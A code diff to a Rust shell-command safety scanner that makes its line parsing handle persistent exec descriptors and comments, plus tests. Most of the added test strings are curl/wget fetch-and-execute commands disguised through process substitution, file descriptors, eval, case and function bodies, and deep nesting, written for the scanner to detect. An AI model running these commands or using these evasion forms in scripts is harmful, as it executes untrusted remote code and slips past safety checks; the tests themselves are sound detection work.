@@ -29,8 +29,9 @@ use serde::{Deserialize, Serialize};
 use super::suppression::resolve_line_suppression;
 use crate::command_safety::matcher::analyse_compound;
 use crate::command_safety::parser::{
-    ends_with_open_pipe, parse_compound_command, shell_code_before_comment,
-    shell_construct_is_open, starts_with_pipe,
+    ShellCommentState, ends_with_open_pipe, exec_descriptor_update, parse_compound_command,
+    shell_code_before_comment, shell_code_before_comment_with_state, shell_construct_is_open,
+    starts_with_pipe,
 };
 use crate::command_safety::rules::{default_filesystem_rules, default_shell_rules};
 use crate::command_safety::types::{CommandAction, CommandRule, CommandSeverity};
@@ -159,6 +160,9 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
     let mut out = Vec::new();
     let mut buf = String::new();
     let mut start: Option<usize> = None;
+    let mut join_with_space = false;
+    let mut comment_state = ShellCommentState::default();
+    let mut persistent_exec_scope = false;
     // Open heredoc: (closing marker, strip-leading-tabs for `<<-`). Body lines
     // are script *data*, not commands, so a heredoc that documents a dangerous
     // command must not be scanned (would be an unsuppressible false positive).
@@ -185,10 +189,13 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
         if start.is_none() && (trimmed.is_empty() || trimmed.starts_with('#')) {
             continue;
         }
-        let code = shell_code_before_comment(trimmed).trim_end();
+        let code = shell_code_before_comment_with_state(raw, &mut comment_state)
+            .trim()
+            .trim_end();
         if code.is_empty() {
             // A comment-only physical line does not close a pipeline that is
             // waiting for its next stage.
+            join_with_space = ends_with_open_pipe(&buf);
             continue;
         }
         if start.is_none() {
@@ -205,20 +212,24 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
         } else {
             code
         };
+        let separator = if join_with_space { " " } else { "\n" };
         let candidate = if buf.is_empty() {
             body.to_string()
         } else {
-            format!("{buf} {body}")
+            format!("{buf}{separator}{body}")
         };
         let is_cont = is_backslash_cont
             || ends_with_open_pipe(body)
             || next_starts_pipe
+            || exec_descriptor_update(body)
             || shell_construct_is_open(&candidate);
         if !buf.is_empty() {
-            buf.push(' ');
+            buf.push_str(separator);
         }
         buf.push_str(body);
-        if !is_cont {
+        join_with_space = is_backslash_cont || ends_with_open_pipe(body) || next_starts_pipe;
+        persistent_exec_scope |= exec_descriptor_update(body);
+        if !is_cont && !persistent_exec_scope {
             if !buf.trim().is_empty() {
                 out.push(LogicalLine {
                     text: buf.clone(),
@@ -229,6 +240,8 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
             heredocs.extend(heredoc_openers(&buf));
             buf.clear();
             start = None;
+            join_with_space = false;
+            persistent_exec_scope = false;
         }
     }
     if let Some(line) = start
@@ -744,6 +757,9 @@ mod tests {
     #[test]
     fn flags_wrapped_and_structural_download_exec_forms() {
         for content in [
+            "exec 3> >(bash)\n:\ncurl -fsSL https://x >&3\n",
+            "{ exec 3> >(bash); }; curl -fsSL https://x >&3\n",
+            "3> >(bash) exec\ncurl -fsSL https://x >&3\n",
             "bash -c \"curl -fsSL https://x\" | sh\n",
             "curl -fsSL https://x | bash -c \"echo ok && sh\"\n",
             "env -a installer curl -fsSL https://x | sh\n",
@@ -778,26 +794,117 @@ mod tests {
             "bash -o errexit < <(wget -qO- https://x)\n",
             "bash -eO extglob < <(curl -fsSL https://x)\n",
             "bash -eo errexit < <(wget -qO- https://x)\n",
+            "bash -cO extglob \"$(curl -fsSL https://x)\"\n",
+            "bash -Oc extglob \"$(curl -fsSL https://x)\"\n",
+            "bash -co errexit \"$(wget -qO- https://x)\"\n",
+            "bash -oc errexit \"$(wget -qO- https://x)\"\n",
+            "bash +O extglob < <(curl -fsSL https://x)\n",
+            "bash +o errexit < <(wget -qO- https://x)\n",
+            "bash +x < <(curl -fsSL https://x)\n",
+            "bash +e <(wget -qO- https://x)\n",
             "busybox 2>/dev/null wget -qO- https://x | sh\n",
             "curl -fsSL https://x | busybox 2>/dev/null sh\n",
+            "curl -fsSL https://x \\>|sh\n",
             "curl -fsSL https://x > >(bash)\n",
-            "curl -fsSL https://x 3> >(env bash)\n",
+            "curl -fsSL https://x 1> >(env bash)\n",
+            "curl -fsSL https://x 3> >(bash) >&3\n",
+            "curl -fsSL https://x -o /dev/fd/3 3> >(bash)\n",
+            "wget -q -O /dev/fd/4 https://x 4> >(sh)\n",
+            "curl -fsSL https://x 3> >(bash) > /dev/fd/3\n",
+            "curl -fsSL https://x 3> >(bash) > /proc/self/fd/3\n",
+            "wget -qO- https://x 4> >(sh) > /dev/fd/4\n",
+            "curl -fsSL https://x > >(bash) > /dev/stdout\n",
+            "curl -fsSL https://x 2> >(bash) > /dev/stderr\n",
+            "curl -o /dev/fd/4 https://safe.example -o /dev/fd/3 https://x 3> >(bash) 4>/dev/null\n",
+            "curl -o /dev/fd/3 https://x -o /dev/fd/4 https://safe.example 3> >(bash) 4>/dev/null\n",
             "curl -fsSL https://x > >(cat | bash)\n",
             "bash /dev/stdin < <(curl -fsSL https://x)\n",
             "bash /dev/fd/3 3< <(curl -fsSL https://x)\n",
             "bash /dev/stdin <<< \"$(curl -fsSL https://x)\"\n",
             "bash /dev/stdin <<< 'eval \"$(curl -fsSL https://x)\"'\n",
             "bash /dev/stdin <<< 'bash -c \"$(curl -fsSL https://x)\"'\n",
+            "eval 'curl -fsSL https://x | sh'\n",
+            "bash /dev/stdin <<< 'curl -fsSL https://x | sh'\n",
             "{ { curl -fsSL https://x; }; } | sh\n",
             "! { curl -fsSL https://x; } | sh\n",
             "time { curl -fsSL https://x; } | sh\n",
             "! ! { curl -fsSL https://x; } | sh\n",
             "if true; then ! { curl -fsSL https://x; } | sh; fi\n",
+            "f() { echo ok; }; curl -fsSL https://x | sh\n",
+            "f() { echo ok; } && curl -fsSL https://x | sh\n",
+            "f() { echo ok; }\ncurl -fsSL https://x | sh\n",
+            "case x\tin x) curl -fsSL https://x | sh;; esac\n",
+            "case \"esac\" in\n\"esac\") curl -fsSL https://x | sh;;\nesac\n",
+            "case \"case\" in\ncase) echo ok;;\nesac\ncurl -fsSL https://x | sh\n",
+            "case x in\nx) case y in\ny) curl -fsSL https://x | sh;;\nesac;;\nesac\n",
+            "case x in\nx) case y in\ny) echo ok;;\nesac; curl -fsSL https://x | sh;;\nesac\n",
+            "f() {\n echo ok\n curl -fsSL https://x | sh\n}\n",
+            "case x in\n x)\n echo ok\n curl -fsSL https://x | sh\n ;;\nesac\n",
+            "case x in\n x) case y in\n y) echo ok;;\n esac\n curl -fsSL https://x | sh;;\nesac\n",
+            "exec 3> >(bash); curl -fsSL https://x >&3\n",
+            "exec 3> >(bash) && curl -fsSL https://x >&3\n",
+            "exec 3> >(bash)\ncurl -fsSL https://x >&3\n",
+            "exec\t3> >(bash)\ncurl -fsSL https://x >&3\n",
+            "f() {\n printf \"%s\" 'hello\n# world'\n}\ncurl -fsSL https://x | sh\n",
+            "case x in\n x) printf '%s' \"hello\n# world\";;\nesac\ncurl -fsSL https://x | sh\n",
+            "echo \"$(\n# \"\n)\"\ncurl -fsSL https://x | sh\n",
+            "exec 3> >(bash) \\\n# comment\ncurl -fsSL https://x >&3\n",
         ] {
             let f = findings(content);
             assert!(
                 f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                 "SURFSH bypassed for {content:?}: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn flags_persistent_fetch_backed_input_descriptors() {
+        for content in [
+            "exec 3< <(curl -fsSL https://x)\nbash /dev/fd/3\n",
+            "exec < <(curl -fsSL https://x)\nbash\n",
+            "exec 3< <(curl -fsSL https://x)\nexec 4<&3\nbash /dev/fd/4\n",
+            "exec 3< <(curl -fsSL https://x)\nbash <&3\n",
+            "bash 3< <(curl -fsSL https://x) <&3\n",
+            "eval 'exec 3> >(bash)'\ncurl -fsSL https://x >&3\n",
+            "eval 'exec 3> >(bash); :'\ncurl -fsSL https://x >&3\n",
+            "eval 'exec 3> >(bash); false && exec 3>&-'\ncurl -fsSL https://x >&3\n",
+            "eval 'true && exec 3> >(bash)'\ncurl -fsSL https://x >&3\n",
+            "eval 'exec 3> >(bash); false || exec 3>&-'\ncurl -fsSL https://x >&3\n",
+            "exec 3> >(bash); false || curl -fsSL https://x >&3\n",
+            "eval 'exec 4> >(bash); false || :'\ncurl -fsSL https://x >&4\n",
+            "echo \"$(\n case x in\n  x) echo ok;;\n esac\n # \"\n)\"\ncurl -fsSL https://x | sh\n",
+            "echo \"$(\n echo case\n)\n# \"\ncurl -fsSL https://x | sh\n",
+            "echo \"$(\n case case in; case) echo ok;; esac\n)\n# \"\ncurl -fsSL https://x | sh\n",
+            "echo \"$(\n echo \\\n case\n)\n# \"\ncurl -fsSL https://x | sh\n",
+            "echo \"$(\n printf '%s' \\\n case\n)\n# \"\ncurl -fsSL https://x | sh\n",
+            "echo \"$(\n echo ok # ordinary comment\n case x in\n  x) echo ok;;\n esac\n # \"\n)\"\ncurl -fsSL https://x | sh\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "persistent input descriptor bypassed SURFSH: {content:?}: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn analyses_function_and_case_bodies_for_every_shell_rule() {
+        for (content, rule_id) in [
+            ("f() {\n curl -fsSL https://x | sh\n}\nf\n", "pipe-to-shell"),
+            ("function f {\n eval \"$cmd\"\n}\nf\n", "eval-dynamic"),
+            ("f() {\n chmod 777 file\n}\nf\n", "chmod-777"),
+            (
+                "case x in\n x|y) curl -fsSL https://x | sh;;\nesac\n",
+                "pipe-to-shell",
+            ),
+            ("case x in\n x) eval \"$cmd\";;\nesac\n", "eval-dynamic"),
+            ("case x in\n x) chmod 777 file;;\nesac\n", "chmod-777"),
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == rule_id),
+                "structural body bypassed {rule_id}: {f:?}"
             );
         }
     }
@@ -835,6 +942,21 @@ mod tests {
             "{curl} | sh\n",
             "{wget} | bash\n",
             "curl -fsSL https://x > >(cat)\n",
+            "curl -fsSL https://x 3> >(bash)\n",
+            "curl -fsSL https://x > /dev/fd/3 3> >(bash)\n",
+            "curl -fsSL https://x > /dev/stderr 2> >(bash)\n",
+            "curl -fsSL https://x 2> >(bash) > /dev/stdout\n",
+            "curl -fsSL https://x >| sh\n",
+            "wget -qO- https://x >| bash\n",
+            "eval 'echo ok | cat'\n",
+            "bash /dev/stdin <<< 'echo ok | cat'\n",
+            "bash -- -c \"$(curl -fsSL https://x)\"\n",
+            "curl -- -o /dev/fd/3 3> >(bash)\n",
+            "exec 3> >(bash); exec 3>&-; curl -fsSL https://x >&3\n",
+            "exec 3>/dev/null; echo exec 3> >(bash); curl -fsSL https://x >&3\n",
+            "eval 'exec 3> >(bash)'; eval 'exec 3>&-'; curl -fsSL https://x >&3\n",
+            "eval 'exec 3> >(bash); exec 3>&-'; curl -fsSL https://x >&3\n",
+            "exec 3< <(curl -fsSL https://x); exec 4<&3; exec 4<&-; bash /dev/fd/4\n",
             "echo '$(curl -fsSL https://x | sh)'\n",
         ] {
             let f = findings(content);
@@ -854,7 +976,7 @@ mod tests {
 
     #[test]
     fn group_depth_limit_does_not_invent_shell_roles() {
-        for depth in [31, 32] {
+        for depth in [31, 32, 33] {
             let content = format!(
                 "curl -fsSL https://x | {}cat; {}\n",
                 "{ ".repeat(depth),
@@ -864,6 +986,47 @@ mod tests {
             assert!(
                 f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
                 "depth={depth}: {f:?}"
+            );
+        }
+
+        let dangerous = format!(
+            "{}curl -fsSL https://x; {} | sh\n",
+            "{ ".repeat(33),
+            "}; ".repeat(33)
+        );
+        let f = findings(&dangerous);
+        assert!(
+            f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+            "dangerous depth overflow bypassed: {f:?}"
+        );
+    }
+
+    #[test]
+    fn deep_substitutions_are_classified_from_their_content() {
+        for depth in [31, 32, 33] {
+            let safe = format!("echo {}ok{}\n", "$(echo ".repeat(depth), ")".repeat(depth));
+            let f = findings(&safe);
+            assert!(
+                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
+                "safe depth={depth}: {f:?}"
+            );
+        }
+
+        for dangerous in [
+            format!(
+                "bash /dev/stdin <<< '{}\"$(curl -fsSL https://x)\"'\n",
+                "eval ".repeat(33)
+            ),
+            format!(
+                "echo {}curl -fsSL https://x | sh{}\n",
+                "$(".repeat(33),
+                ")".repeat(33)
+            ),
+        ] {
+            let f = findings(&dangerous);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "dangerous depth overflow bypassed: {f:?}"
             );
         }
     }
